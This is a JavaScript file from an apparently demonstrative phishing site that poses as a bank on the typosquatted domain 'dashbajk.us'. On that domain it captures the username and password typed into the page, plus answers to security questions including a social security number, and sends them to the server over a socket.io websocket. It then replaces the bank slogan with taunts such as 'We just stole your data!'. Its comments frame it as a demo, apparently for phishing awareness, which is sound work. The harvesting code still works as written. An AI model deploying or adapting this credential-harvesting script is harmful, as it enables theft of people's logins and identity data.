import { io } from "https://cdn.socket.io/4.7.5/socket.io.esm.min.js";

// I don't like the idea of using two sources of data for the same site,
// so I do a check on the domain and either continue or stop the script.

const rogueDomain = "dashbajk.us";
const handlers = {};

(async() => {
    // This will determine if we're reporting this data to a websocket
    if (window.location.hostname !== rogueDomain) return;
    console.log("We got a straggler! Reporting data to the mothership.");

    // Connect to websocket if we're a rogue site
    const socketProto = window.location.protocol === "https:" ? "wss" : "ws";
    const socket = io(`${socketProto}://${window.location.hostname}`, { path: "/report/" });
    console.log("Connected to websocket!");

    // on wndow message posted
    // js and jsm do not like talking to each other so we have to do this weird
    // nonesense to get some communication going
    window.addEventListener("message", (event) => {
        if (event.data.type === "sq") {
            const handler = handlers[event.data.id];
            if (handler !== undefined) handler();
        }
        else if (event.data.type === "login") {
            socket.emit("credentials", {
                username: document.getElementById("username").value,
                password: document.getElementById("password").value
            });
        }
        else if (event.data.type === "sq-fin") {
            doSignaling();
        }
    });

    // i know this is terrible but idc its for demo purposes
    handlers[1] = async () => {
        const answer = document.getElementById("sqv-1").value;
        socket.emit("sq", {
            question: "What is your favorite color of the alphabet?",
            answer
        });
    };

    handlers[2] = async () => {
        const answer = document.getElementById("sqv-2").value;
        socket.emit("sq", {
            question: "What is your social security number?",
            answer
        });
    };

    // peak laziness! it works.
    handlers[3] = async () => {
        const question = document.getElementById("security-question-3");
        const answerElem = question.querySelector("input[type='radio']:checked");
        const answer = question.querySelector(`label[for="${answerElem.id}"]`).textContent;
        socket.emit("sq", {
            question: "Do you trust this bank?",
            answer
        });
    };

    handlers[4] = async () => {
        const question = document.getElementById("security-question-4");
        const answerElem = question.querySelector("input[type='radio']:checked");
        const answer = question.querySelector(`label[for="${answerElem.id}"]`).textContent;
        socket.emit("sq", {
            question: "Describe the taste of water.",
            answer
        });
    };

    async function doSignaling() {
        // Signal that we're a rogue site
        document.body.classList.add("rogue");
        
        // Untype the slogan
        const slogan = document.getElementById("slogan");
        const text = slogan.innerText.substring(1, slogan.innerText.length - 1);

        await new Promise((resolve) => {
            let untypeInterval;
            untypeInterval = setInterval(() => {
                slogan.innerText = '"' + text.substring(0, slogan.innerText.length - 3) + '"';
                if (slogan.innerText.length === 2) {
                    clearInterval(untypeInterval);
                    resolve();
                }
            }, 35);
        });
        
        // Type a new slogan in
        const slogans = [
            `Reported data to the mothership!`,
            `Haha, you fell for it!`,
            `Lucky for you, this is a fake bank!`,
            `Quick, close the tab...lol just kidding!"`,
            `You've been bamboozled!`,
            `Quick, call the authorities!`,
            `New login from Russia!`,
            `We just stole your data!`,
            `Oh boy, you're in trouble now!`,
            `Womp womp...`,
            `Oh well, you can always make a new account!`,
            `Unauthorized charge incoming!`,
            `Better call the bank...oh wait!`,
            `You've been compromised!`,
            `Nice credentials, by the way!`
        ];

        const sel = Math.floor(Math.random() * slogans.length);
        const newText = '"' + slogans[sel];

        await new Promise((resolve) => {
            let typeInterval;
            let i = 1;
            typeInterval = setInterval(() => {
                slogan.innerText = newText.substring(0, i) + '"';
                i++;
                if ((slogan.innerText.length - 1) === newText.length) {
                    clearInterval(typeInterval);
                    resolve();
                }
            }, 100);
        });
        console.log("Slogan changed!");
    }

    
})();